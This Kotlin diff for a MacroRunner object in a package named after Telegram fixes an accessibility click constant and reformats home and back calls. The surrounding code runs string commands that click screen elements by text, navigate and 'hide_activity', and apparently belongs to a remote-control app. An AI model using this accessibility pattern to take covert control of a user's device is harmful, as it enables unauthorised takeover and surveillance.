@@ -1,6 +1,7 @@
 package com.telegram2.messaging.remote
 
 import android.accessibilityservice.AccessibilityService
+import android.view.accessibility.AccessibilityNodeInfo
 
 object MacroRunner {
     var currentPackage: String? = null
@@ -71,7 +72,7 @@ object MacroRunner {
                     val root = service.rootInActiveWindow
                     for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                         if (node.isClickable) {
-                            node.performAction(AccessibilityService.ACTION_CLICK)
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                             return@runOnMainThreadSync true
                         }
                     }
@@ -79,11 +80,15 @@ object MacroRunner {
                 } as Boolean
             }
             "home" -> {
-                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
+                service.runOnMainThreadSync {
+                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
+                }
                 true
             }
             "back" -> {
-                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
+                service.runOnMainThreadSync {
+                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
+                }
                 true
             }
             "hide_activity" -> {
